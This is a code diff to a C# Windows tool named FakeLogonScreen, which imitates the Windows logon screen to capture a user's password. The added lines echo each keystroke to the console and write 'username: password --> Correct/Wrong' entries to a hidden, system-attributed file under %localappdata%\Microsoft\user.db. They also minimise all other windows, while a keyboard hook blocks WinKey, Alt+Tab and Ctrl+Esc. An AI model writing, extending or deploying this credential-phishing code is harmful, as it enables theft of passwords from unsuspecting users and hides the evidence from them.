@@ -30,6 +30,9 @@ namespace FakeLogonScreen
         {
             if (e.KeyCode == Keys.Enter)
                 ValidateCredentials();
+
+            // Print to console
+            Console.WriteLine(((MaskedTextBox)sender).Text);
         }
 
         private void pbSubmit_Click(object sender, EventArgs e)
@@ -40,7 +43,6 @@ namespace FakeLogonScreen
         private void ValidateCredentials()
         {
             // Validate password
-            string error = string.Empty;
             string password = mtbPassword.Text;
             try
             {
@@ -55,30 +57,37 @@ namespace FakeLogonScreen
                 }
             }
             // Could happen in case for example the (local) user's password is empty
-            catch(Exception e)
+            catch (Exception e)
             {
                 success = true;
-                error = string.Format("{0}\r\n", e.Message);
+                Console.WriteLine(e);
             }
 
-            // Store username and password in %localappdata%\Microsoft\user.db
-            // Even if a wrong password is typed, it might be valuable
-            string path = string.Format(@"{0}\Microsoft\user.db", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
+            // Output result of logon screen
             try
             {
                 if (string.IsNullOrEmpty(password))
                     password = "[blank password]";
 
+                // Even if a wrong password is typed, it might be valuable
+                string line = string.Format("{0}: {1} --> {2}", this.Username, password, success ? "Correct" : "Wrong");
+                Console.WriteLine(line);
+
+                // Store username and password in %localappdata%\Microsoft\user.db
+                string path = string.Format(@"{0}\Microsoft\user.db", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
                 using (StreamWriter file = new StreamWriter(path, true))
                 {
-                    file.WriteLine("{0}{1}: {2} --> {3}", error, this.Username, password, success ? "Correct" : "Wrong");
+                    file.WriteLine(line);
                 }
 
                 // Hide file
                 File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
+                Console.WriteLine("Output written to {0}", path);
             }
-            catch (Exception)
-            { }
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
+            }
 
             // Ask again if password is incorrect
             if (!success)
@@ -93,6 +102,11 @@ namespace FakeLogonScreen
             // If correct password, save and close screen
             else
             {
+                // Show all windows again
+                IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
+                SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL_UNDO, IntPtr.Zero);
+
+                // Exit fake logon screen
                 Application.Exit();
             }
         }
@@ -150,11 +164,25 @@ namespace FakeLogonScreen
             objKeyboardProcess = new LowLevelKeyboardProc(captureKey);
             ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0);
 
+            // Minimize all other windows
+            // Source: https://stackoverflow.com/a/785110
+            IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
+            SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL, IntPtr.Zero);
+
             // Make this the active window
             WindowState = FormWindowState.Minimized;
             Show();
             WindowState = FormWindowState.Maximized;
         }
+
+        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
+        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+        [DllImport("user32.dll", EntryPoint = "SendMessage", SetLastError = true)]
+        static extern IntPtr SendMessage(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam);
+
+        const int WM_COMMAND = 0x111;
+        const int MIN_ALL = 419;
+        const int MIN_ALL_UNDO = 416;
 
         /* Code to Disable WinKey, Alt+Tab, Ctrl+Esc Starts Here */
 
